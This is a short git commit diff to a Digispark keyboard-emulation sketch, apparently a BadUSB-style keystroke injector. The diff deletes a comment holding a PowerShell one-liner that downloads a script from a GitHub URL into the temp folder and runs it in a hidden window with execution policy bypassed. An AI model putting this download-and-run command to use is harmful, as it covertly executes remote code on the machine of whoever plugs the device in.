4e0a7d3bea1f366829d4e908065e810ce8b4006e
Nicola Lepore <n.lepore@studenti.unipi.it>
2025-04-27 18:07:31 +0200

    Update digi-code.cpp

--- digi-code.cpp
+++ digi-code.cpp
@@ -1,5 +1,5 @@
 #include "DigiKeyboard.h"
-// command: (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/NicolaLepore4/Digi-sounds/main/script.sh', "$env:TEMP\script.ps1"); Start-Process powershell -ArgumentList '-ExecutionPolicy Bypass -File', "$env:TEMP\script.ps1" -WindowStyle Hidden
+
 void setup() {
   DigiKeyboard.sendKeyStroke(0);
   DigiKeyboard.delay(1000);
